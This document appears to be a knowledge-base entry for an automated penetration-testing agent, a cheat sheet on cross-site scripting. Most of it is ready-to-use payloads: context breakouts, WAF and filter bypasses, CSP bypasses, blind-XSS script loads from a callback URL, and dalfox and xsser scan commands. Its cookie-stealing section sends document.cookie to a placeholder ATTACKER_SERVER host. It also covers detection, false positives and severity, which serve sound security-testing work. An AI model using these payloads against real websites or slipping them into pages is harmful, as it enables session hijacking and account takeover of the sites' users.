---
vuln_type: xss
severity: high
cwe: [CWE-79]
owasp: A03:2021-Injection
related_tools: [dalfox, xsser, curl]
exploit_agent: xss_agent
tags: [xss, reflected, stored, dom-based, cross-site-scripting, waf-bypass, csp-bypass]
---

# Cross-Site Scripting (XSS)

## Overview
Occurs when an application includes untrusted data in web output without proper escaping or validation. Allows attackers to execute JavaScript in victims' browsers, steal sessions, redirect users, or modify page content.

---

## Three Types

### Reflected XSS
- Payload is in the request (URL, POST body, header)
- Server reflects it back in the response without sanitization
- Requires victim to click a crafted link
- Most common type

### Stored XSS
- Payload is saved in the database/storage (comment, profile, message)
- Executes every time the stored content is viewed
- Higher impact — affects all users who view the content
- No crafted link needed after initial injection

### DOM-based XSS
- Payload never reaches the server
- Client-side JavaScript reads from a source (URL hash, `document.referrer`) and writes to a dangerous sink (`innerHTML`, `eval()`, `document.write()`)
- Harder to detect — server logs show nothing

---

## Injection Points

| Location | Example | Type |
|----------|---------|------|
| URL parameter | `?search=<script>` | Reflected |
| POST body | `comment=<script>` | Reflected/Stored |
| URL fragment | `#<img onerror=alert(1)>` | DOM |
| HTTP header | `Referer: <script>` | Reflected (rare) |
| File name | Upload `"><img src=x>.png` | Stored |
| JSON response | `{"name":"<script>"}` rendered in DOM | Reflected/Stored |
| Error messages | Input echoed in error text | Reflected |
| Search results | `Showing results for: <script>` | Reflected |

---

## Detection Techniques

### Step 1: Find reflection points
Inject a unique canary string and search for it in the response:
```
xss_test_12345
```
If `xss_test_12345` appears in the HTML response, the parameter reflects input.

### Step 2: Determine the context
Where in the HTML does reflection occur?

**Inside HTML body:**
```html
<p>Your search: REFLECTION_HERE</p>
```
→ Try: `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`

**Inside an HTML attribute:**
```html
<input value="REFLECTION_HERE">
```
→ Try: `" onmouseover="alert(1)` or `"><script>alert(1)</script>`

**Inside JavaScript string:**
```html
<script>var x = "REFLECTION_HERE";</script>
```
→ Try: `";alert(1)//` or `</script><script>alert(1)</script>`

**Inside JavaScript template literal:**
```html
<script>var x = `REFLECTION_HERE`;</script>
```
→ Try: `${alert(1)}`

**Inside HTML comment:**
```html
<!-- REFLECTION_HERE -->
```
→ Try: `--><script>alert(1)</script><!--`

**Inside CSS:**
```html
<style>body{color:REFLECTION_HERE}</style>
```
→ Try: `}</style><script>alert(1)</script>`

**Inside URL/href:**
```html
<a href="REFLECTION_HERE">
```
→ Try: `javascript:alert(1)` or `" onclick="alert(1)`

### Step 3: Test for execution
Escalate from canary to actual payloads based on context.

---

## Core Payloads

### Universal starters
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
```

### Attribute breakout
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onfocus='alert(1)' autofocus='
"><script>alert(1)</script>
'><script>alert(1)</script>
```

### JavaScript context breakout
```html
";alert(1)//
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

### Without parentheses (if filtered)
```html
<img src=x onerror=alert`1`>
<svg onload=alert&lpar;1&rpar;>
<img src=x onerror="window['alert'](1)">
```

### Without `alert` keyword
```html
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=print()>
<svg onload=top[/al/.source+/ert/.source](1)>
```

### Event handlers (no user interaction needed)
```html
<svg onload=alert(1)>
<body onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<object data="javascript:alert(1)">
```

### Event handlers (require interaction — use only if auto-fire fails)
```html
<div onmouseover=alert(1)>hover me</div>
<a href="#" onclick=alert(1)>click</a>
<input onchange=alert(1) value=1>
```

---

## DOM-based XSS

### Common sources
```javascript
document.URL
document.documentURI
document.referrer
location.href
location.hash
location.search
window.name
document.cookie
postMessage data
```

### Common sinks
```javascript
innerHTML
outerHTML
document.write()
document.writeln()
eval()
setTimeout(string)
setInterval(string)
Function(string)
element.setAttribute("onclick", ...)
jQuery.html()
jQuery.append()
$.globalEval()
```

### Detection
1. Read page JavaScript source
2. Look for patterns where source flows to sink:
   ```javascript
   document.getElementById('output').innerHTML = location.hash.substring(1);
   ```
3. Craft payload in the source: `http://target/#<img src=x onerror=alert(1)>`

---

## Stealing Cookies / Session Hijacking

```html
<script>new Image().src="http://ATTACKER_SERVER/steal?c="+document.cookie</script>
<script>fetch("http://ATTACKER_SERVER/steal?c="+document.cookie)</script>
<img src=x onerror="this.src='http://ATTACKER_SERVER/steal?c='+document.cookie">
```

Use `interactsh` or a simple HTTP listener as the callback server.

---

## Blind XSS

Payload stored and triggers when an admin/internal user views it (e.g., support ticket, log viewer, admin panel).

### Detection payloads
```html
<script src=https://YOUR_INTERACTSH_URL></script>
"><script src=https://YOUR_INTERACTSH_URL></script>
'><script src=https://YOUR_INTERACTSH_URL></script>
```

### With dalfox
```bash
dalfox url "http://target/submit" -b "YOUR_INTERACTSH_URL" --data "comment=FUZZ"
```

If the interactsh server receives a callback, blind XSS is confirmed.

---

## WAF / Filter Bypass Techniques

### Tag filtering
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Null bytes -->
<scr%00ipt>alert(1)</scr%00ipt>

<!-- Uncommon tags -->
<svg onload=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=x>">
<details open ontoggle=alert(1)>
```

### Keyword filtering (`script`, `alert`, `onerror`)
```html
<!-- No script tag needed -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

<!-- Alternatives to alert -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>

<!-- String construction -->
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=top[/al/.source+/ert/.source](1)>

<!-- Encoding in event handlers -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

### Bracket/parentheses filtering
```html
<img src=x onerror=alert`1`>
<img src=x onerror="window.onerror=alert;throw 1">
```

### Quote filtering
```html
<img src=x onerror=alert(1)>         <!-- no quotes needed -->
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

### Slash filtering
```html
<img src=x onerror=alert(1)>  <!-- self-closing not needed -->
```

### Space filtering
```html
<svg/onload=alert(1)>     <!-- / instead of space -->
<img%09src=x%09onerror=alert(1)>  <!-- tab -->
<img%0asrc=x%0aonerror=alert(1)>  <!-- newline -->
```

---

## CSP Bypass Techniques

### JSONP endpoints (if CSP allows the domain)
```html
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>
```

### Angular JS (if loaded and CSP allows unsafe-eval)
```html
{{constructor.constructor('alert(1)')()}}
```

### Base tag injection (if CSP has no base-uri directive)
```html
<base href="https://attacker.com/">
<!-- Scripts with relative paths now load from attacker -->
```

### Script nonce reuse
If the same nonce is used across requests, inject:
```html
<script nonce="KNOWN_NONCE">alert(1)</script>
```

### DOM clobbering
Overwrite global variables using HTML elements with matching `id` or `name` attributes to redirect script execution.

---

## Automated Tool Commands

### dalfox (recommended)
```bash
# Basic scan
dalfox url "http://target/search?q=test"

# With blind XSS callback
dalfox url "http://target/search?q=test" -b "YOUR_INTERACTSH_URL"

# POST data
dalfox url "http://target/comment" --data "text=FUZZ" -b "YOUR_INTERACTSH_URL"

# With cookies
dalfox url "http://target/search?q=test" -C "PHPSESSID=abc123;security=low"

# Pipe from parameter discovery
cat params.txt | dalfox pipe
```

### xsser
```bash
xsser -u "http://target/search?q=XSS" --auto
xsser -u "http://target/search?q=XSS" --Fp "<script>alert(1)</script>"
```

---

## Output Interpretation

### Confirmed XSS indicators
- Payload appears unescaped in HTML response
- JavaScript executes (alert fires, callback received)
- dalfox output: `[POC]` line with working payload
- Response contains injected tag in raw HTML (not entity-encoded)

### Not XSS (false positives)
- Payload reflected but HTML-entity-encoded (`&lt;script&gt;`)
- Payload reflected but inside a non-rendered context (e.g., HTML comment, hidden input with no event)
- CSP blocks execution even though payload is in the DOM
- JavaScript reflected in JSON response but never rendered in DOM

### Severity assessment
- **Critical**: Stored XSS in widely viewed page (admin panel, public comments)
- **High**: Reflected XSS with cookie stealing (no HttpOnly, no CSP)
- **Medium**: Reflected XSS with limited impact (CSP blocks exfil, HttpOnly cookies)
- **Low**: Self-XSS only (requires victim to paste payload themselves)
- **Info**: DOM-based with no sensitive data accessible
